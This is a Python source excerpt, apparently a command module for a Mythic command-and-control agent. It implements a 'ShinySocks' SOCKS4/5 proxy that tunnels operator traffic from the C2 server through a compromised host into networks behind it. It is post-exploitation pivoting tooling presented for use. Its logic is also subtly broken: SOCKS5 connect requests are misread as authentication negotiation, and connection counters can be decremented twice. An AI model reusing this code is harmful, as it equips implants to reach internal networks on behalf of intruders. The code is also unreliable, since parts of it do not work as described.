
    def shinysocks(self, task_id, action, port):
        """
        Enhanced SOCKS proxy implementation with shinysocks features
        Maintains the same function structure as the original SOCKS command
        """
        import socket
        import select
        import queue
        import threading
        import time
        import base64
        import struct
        from threading import Thread, active_count
        
        # Enhanced configuration constants (inspired by shinysocks)
        MAX_THREADS = 300
        BUFSIZE = 8192  # Increased from 2048 for better performance
        TIMEOUT_SOCKET = 15  # Increased timeout for stability
        OUTGOING_INTERFACE = ""
        
        # Protocol constants
        VER = b'\x05'
        SOCKS4_VER = b'\x04'
        M_NOAUTH = b'\x00'
        M_NOTAVAILABLE = b'\xff'
        CMD_CONNECT = b'\x01'
        ATYP_IPV4 = b'\x01'
        ATYP_DOMAINNAME = b'\x03'
        ATYP_IPV6 = b'\x04'
        
        # Enhanced timing constants
        SOCKS_SLEEP_INTERVAL = 0.01  # Reduced for better responsiveness
        QUEUE_TIMEOUT = 3  # Increased timeout
        
        # Statistics tracking (shinysocks feature)
        stats = {
            'total_connections': 0,
            'active_connections': 0,
            'bytes_transferred': 0,
            'protocol_v4_count': 0,
            'protocol_v5_count': 0,
            'hostname_resolutions': 0,
            'connection_errors': 0
        }
        
        def log_info(message):
            """Enhanced logging function"""
            # In a real Mythic agent, this would use self.sendTaskOutputUpdate
            print(f"[*] ShinySocks: {message}")
            
        def log_error(message):
            """Enhanced error logging function"""
            # In a real Mythic agent, this would use self.sendTaskOutputUpdate
            print(f"[!] ShinySocks Error: {message}")
        
        def sendSocksPacket(server_id, data, exit_value):
            """Send SOCKS packet with enhanced error handling"""
            try:
                self.socks_out.put({
                    "server_id": server_id,
                    "data": base64.b64encode(data).decode() if data else "",
                    "exit": exit_value
                })
                
                # Update statistics
                if data:
                    stats['bytes_transferred'] += len(data)
                    
            except Exception as e:
                log_error(f"Failed to send SOCKS packet: {e}")
        
        def create_socket():
            """Create socket with enhanced configuration"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT_SOCKET)
                # Enable TCP_NODELAY for better performance (like shinysocks)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                # Enable SO_REUSEADDR
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                return sock
            except Exception as e:
                log_error(f"Failed to create socket: {e}")
                return None
        
        def resolve_hostname(hostname):
            """Resolve hostname to IP address with enhanced error handling"""
            try:
                log_info(f"Resolving hostname: {hostname}")
                ip = socket.gethostbyname(hostname)
                stats['hostname_resolutions'] += 1
                log_info(f"Resolved {hostname} to {ip}")
                return ip
            except socket.gaierror as e:
                log_error(f"Failed to resolve hostname {hostname}: {e}")
                stats['connection_errors'] += 1
                return None
        
        def connect_to_dst(dst_addr, dst_port):
            """Connect to destination with enhanced error handling"""
            sock = create_socket()
            if not sock:
                return 0
                
            if OUTGOING_INTERFACE:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, OUTGOING_INTERFACE.encode())
                except PermissionError:
                    log_error("Permission denied for interface binding")
                    
            try:
                log_info(f"Connecting to {dst_addr}:{dst_port}")
                sock.connect((dst_addr, dst_port))
                stats['total_connections'] += 1
                stats['active_connections'] += 1
                return sock
            except socket.error as err:
                log_error(f"Failed to connect to {dst_addr}:{dst_port}: {err}")
                stats['connection_errors'] += 1
                try:
                    sock.close()
                except:
                    pass
                return 0
        
        def parse_socks4_request(s4_request):
            """Parse SOCKS4 request with 4a support"""
            if len(s4_request) < 9:
                return False
                
            try:
                # Extract command, port, and IP
                command = s4_request[1]
                if command != 1:  # Only CONNECT supported
                    return False
                    
                port = struct.unpack(">H", s4_request[2:4])[0]
                ip_bytes = s4_request[4:8]
                
                # Check for SOCKS4a (0.0.0.x format)
                if ip_bytes[:3] == b'\x00\x00\x00' and ip_bytes[3] != 0:
                    # Find the hostname after the null-terminated user ID
                    null_pos = s4_request.find(b'\x00', 8)
                    if null_pos != -1 and null_pos + 1 < len(s4_request):
                        hostname = s4_request[null_pos + 1:].split(b'\x00')[0].decode('utf-8')
                        resolved_ip = resolve_hostname(hostname)
                        if resolved_ip:
                            stats['protocol_v4_count'] += 1
                            return (resolved_ip, port)
                    return False
                
                dst_addr = socket.inet_ntoa(ip_bytes)
                stats['protocol_v4_count'] += 1
                return (dst_addr, port)
                
            except Exception as e:
                log_error(f"Failed to parse SOCKS4 request: {e}")
                return False
        
        def parse_socks5_request(s5_request):
            """Parse SOCKS5 request with enhanced address type support"""
            if len(s5_request) < 7:
                return False
                
            try:
                # Check version and command
                if s5_request[0] != 5 or s5_request[1] != 1:  # Version 5, CONNECT command
                    return False
                    
                addr_type = s5_request[3]
                
                if addr_type == 1:  # IPv4
                    if len(s5_request) < 10:
                        return False
                    dst_addr = socket.inet_ntoa(s5_request[4:8])
                    dst_port = struct.unpack(">H", s5_request[8:10])[0]
                    stats['protocol_v5_count'] += 1
                    return (dst_addr, dst_port)
                    
                elif addr_type == 3:  # Domain name
                    domain_len = s5_request[4]
                    if len(s5_request) < 7 + domain_len:
                        return False
                    hostname = s5_request[5:5+domain_len].decode('utf-8')
                    dst_port = struct.unpack(">H", s5_request[5+domain_len:7+domain_len])[0]
                    
                    resolved_ip = resolve_hostname(hostname)
                    if resolved_ip:
                        stats['protocol_v5_count'] += 1
                        return (resolved_ip, dst_port)
                    return False
                    
                elif addr_type == 4:  # IPv6
                    log_error("IPv6 not supported")
                    return False
                    
            except Exception as e:
                log_error(f"Failed to parse SOCKS5 request: {e}")
                return False
            
            return False
        
        def request_client(msg):
            """Handle SOCKS request with protocol detection"""
            try:
                message = base64.b64decode(msg["data"])
                
                if len(message) < 2:
                    return False
                    
                # Detect protocol version
                version = message[0]
                
                if version == 4:
                    # SOCKS4/4a
                    return parse_socks4_request(message)
                    
                elif version == 5:
                    # Check if this is authentication negotiation
                    if len(message) >= 2 and message[1] <= 10:  # Reasonable number of auth methods
                        # Authentication negotiation
                        num_methods = message[1]
                        if len(message) >= 2 + num_methods:
                            # Check for no-auth method
                            methods = message[2:2+num_methods]
                            if 0 in methods:  # No authentication required
                                auth_reply = b'\x05\x00'  # Version 5, no auth
                                sendSocksPacket(msg["server_id"], auth_reply, False)
                                return "auth_ok"  # Special return value
                            else:
                                # No acceptable methods
                                auth_reply = b'\x05\xff'
                                sendSocksPacket(msg["server_id"], auth_reply, msg["exit"])
                                return False
                    else:
                        # This should be the actual SOCKS5 request
                        return parse_socks5_request(message)
                        
            except Exception as e:
                log_error(f"Failed to handle SOCKS request: {e}")
                
            return False
        
        def create_connection(msg):
            """Create connection and send appropriate SOCKS reply"""
            dst = request_client(msg)
            server_id = msg["server_id"]
            
            # Handle SOCKS5 auth negotiation
            if dst == "auth_ok":
                return None  # Wait for actual request
                
            rep = b'\x07'
            bnd = b'\x00' * 6 # Default to all zeros
            
            socket_dst = 0
            if dst:
                socket_dst = connect_to_dst(dst[0], dst[1])
                
            if not dst or socket_dst == 0:
                rep = b'\x01'
            else:
                rep = b'\x00'
                try:
                    local_addr = socket_dst.getsockname()
                    bnd = socket.inet_aton(local_addr[0]) + struct.pack(">H", local_addr[1])
                except:
                    bnd = b'\x00' * 6
                    
            # Determine protocol version from original message for reply
            try:
                message = base64.b64decode(msg["data"])
                version = message[0]
                
                if version == 4:
                    # SOCKS4 reply format
                    if rep == b'\x00':
                        reply = b'\x00\x5a' + bnd  # Success
                    else:
                        reply = b'\x00\x5b' + b'\x00' * 6  # Failure
                else:
                    # SOCKS5 reply format
                    reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
                    
            except:
                # Default to SOCKS5 format if protocol detection fails
                reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
                
            try:
                sendSocksPacket(server_id, reply, msg["exit"])
            except:
                return None
                
            if rep == b'\x00':
                return socket_dst
            return None

        def get_running_socks_thread():
            """Get running shinysocks threads"""
            return [t for t in threading.enumerate() if "shinysocks:" in t.name and task_id not in t.name]

        def a2m(server_id, socket_dst):
            """Relay data from agent to Mythic (client to server)"""
            try:
                while True:
                    # Access attributes directly from MockTask objects
                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
                    if not current_task_obj or current_task_obj.stopped:
                        return
                    if server_id not in self.socks_open.keys():
                        return
                        
                    try:
                        reader, _, _ = select.select([socket_dst], [], [], 1)
                    except select.error:
                        return

                    if not reader:
                        continue
                        
                    try:
                        for sock in reader:
                            data = sock.recv(BUFSIZE)
                            if not data:
                                sendSocksPacket(server_id, b"", True)
                                socket_dst.close()
                                stats['active_connections'] -= 1
                                return
                            sendSocksPacket(server_id, data, False)
                    except Exception as e:
                        log_error(f"A2M relay error: {e}")
                        break
                        
                    time.sleep(SOCKS_SLEEP_INTERVAL)
                    
            finally:
                try:
                    socket_dst.close()
                except:
                    pass
                if server_id in self.socks_open:
                    stats['active_connections'] -= 1

        def m2a(server_id, socket_dst):
            """Relay data from Mythic to agent (server to client)"""
            try:
                while True:
                    # Access attributes directly from MockTask objects
                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
                    if not current_task_obj or current_task_obj.stopped:
                        return                
                    if server_id not in self.socks_open.keys():
                        socket_dst.close()
                        return
                        
                    try:
                        if not self.socks_open[server_id].empty():
                            data_b64 = self.socks_open[server_id].get(timeout=QUEUE_TIMEOUT)
                            data = base64.b64decode(data_b64)
                            socket_dst.send(data)
                    except queue.Empty:
                        pass
                    except Exception as e:
                        log_error(f"M2A relay error: {e}")
                        break
                        
                    time.sleep(SOCKS_SLEEP_INTERVAL)
                    
            finally:
                try:
                    socket_dst.close()
                except:
                    pass

        def print_stats():
            """Print current statistics (shinysocks feature)"""
            log_info(f"Statistics: Active: {stats['active_connections']}")
            log_info(f"Total: {stats['total_connections']}")
            log_info(f"Bytes: {stats['bytes_transferred']}")
            log_info(f"SOCKS4: {stats['protocol_v4_count']}")
            log_info(f"SOCKS5: {stats['protocol_v5_count']}")
            log_info(f"DNS: {stats['hostname_resolutions']}")
            log_info(f"Errors: {stats['connection_errors']}")

        # Main execution logic
        t_socks = get_running_socks_thread()

        if action == "start":
            if len(t_socks) > 0:
                return "[!] ShinySocks Proxy already running."
                
            log_info("ShinySocks Proxy started with enhanced features")
            log_info(f"Configuration: Max threads: {MAX_THREADS}, "
                    f"Buffer size: {BUFSIZE}, Timeout: {TIMEOUT_SOCKET}s")
            
            # Statistics reporting thread
            def stats_reporter():
                while True:
                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
                    if not current_task_obj or current_task_obj.stopped:
                        break
                    time.sleep(30)  # Report every 30 seconds
                    if stats['total_connections'] > 0:
                        print_stats()
            
            stats_thread = Thread(target=stats_reporter, name=f"shinysocks_stats:{task_id}")
            stats_thread.daemon = True
            stats_thread.start()
            
            try:
                while True:
                    current_task_obj = next((t for t in self.taskings if t.task_id == task_id), None)
                    if not current_task_obj or current_task_obj.stopped:
                        log_info("ShinySocks Proxy stopped.")
                        print_stats()  # Final stats
                        return "[*] ShinySocks Proxy stopped."
                        
                    if not self.socks_in.empty():
                        packet_json = self.socks_in.get(timeout=QUEUE_TIMEOUT)
                        if packet_json:
                            server_id = packet_json["server_id"]
                            
                            if server_id in self.socks_open.keys():
                                if packet_json["data"]: 
                                    self.socks_open[server_id].put(packet_json["data"])
                                elif packet_json["exit"]:
                                    self.socks_open.pop(server_id, None)
                                    stats['active_connections'] -= 1
                            else:
                                if not packet_json["exit"]:    
                                    if active_count() > MAX_THREADS:
                                        log_error("Thread limit exceeded, waiting...")
                                        time.sleep(1)
                                        continue
                                        
                                    self.socks_open[server_id] = queue.Queue()
                                    sock = create_connection(packet_json)
                                    
                                    if sock:
                                        send_thread = Thread(
                                            target=a2m,
                                            args=(server_id, sock),
                                            name=f"shinysocks_a2m:{server_id}"
                                        )
                                        recv_thread = Thread(
                                            target=m2a,
                                            args=(server_id, sock),
                                            name=f"shinysocks_m2a:{server_id}"
                                        )
                                        send_thread.start()
                                        recv_thread.start()
                                        
                    time.sleep(SOCKS_SLEEP_INTERVAL)
                    
            except Exception as e:
                log_error(f"Main loop error: {e}")
                return f"[!] ShinySocks Proxy error: {e}"
                
        elif action == "stop":
            if len(t_socks) > 0:
                for t_sock in t_socks:
                    task_parts = t_sock.name.split(":")
                    if len(task_parts) > 1:
                        # Access attributes directly from MockTask objects
                        task_obj = next((t for t in self.taskings if t.task_id == task_parts[1]), None)
                        if task_obj:
                            task_obj.stopped = True
                            task_obj.completed = True
                self.socks_open = {}
                log_info("ShinySocks Proxy stopped by user request")
                print_stats()  # Final stats
                return "[*] ShinySocks Proxy stopped."
            else:
                return "[!] No ShinySocks Proxy running."
                
        elif action == "status":
            if len(t_socks) > 0:
                status_msg = "[*] ShinySocks Status:\n"
                status_msg += f"    Running: Yes\n"
                status_msg += f"    Active connections: {stats['active_connections']}\n"
                status_msg += f"    Total connections: {stats['total_connections']}\n"
                status_msg += f"    Bytes transferred: {stats['bytes_transferred']}\n"
                status_msg += f"    SOCKS4 requests: {stats['protocol_v4_count']}\n"
                status_msg += f"    SOCKS5 requests: {stats['protocol_v5_count']}\n"
                status_msg += f"    Hostname resolutions: {stats['hostname_resolutions']}\n"
                status_msg += f"    Connection errors: {stats['connection_errors']}"
                return status_msg
            else:
                return "[!] No ShinySocks Proxy running."
        
        else:
            return f"[!] Unknown action: {action}. Use 'start', 'stop', or 'status'."




